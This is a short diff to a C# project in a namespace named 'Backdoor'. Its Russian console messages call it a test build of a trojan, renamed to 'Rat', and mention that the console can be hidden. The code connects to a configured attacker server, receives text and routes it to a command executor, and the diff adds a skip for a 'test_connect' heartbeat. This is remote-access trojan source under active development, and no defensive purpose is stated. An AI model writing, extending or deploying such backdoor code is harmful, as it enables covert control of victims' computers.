@@ -18,7 +18,7 @@ namespace Backdoor
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("Привет это тестовая сборка трояна Софья(или София или Cоня и Софа)");
+            Console.WriteLine("Привет это тестовая сборка Rat");
             Console.WriteLine("Консоль можно будет скрыть в настройках");
             var server = new Server(Settings.ipAdr, Settings.port);
             server.Connect();
@@ -76,7 +76,7 @@ namespace Backdoor
 
                 CommandExecutor executor = new CommandExecutor();
                 data = Encoding.UTF8.GetString(bytes, 0, bytesRec);
-
+                if (data == "test_connect") continue; 
 
                 Console.Write("Полученный текст: " + data + "\n\n"); ;
 
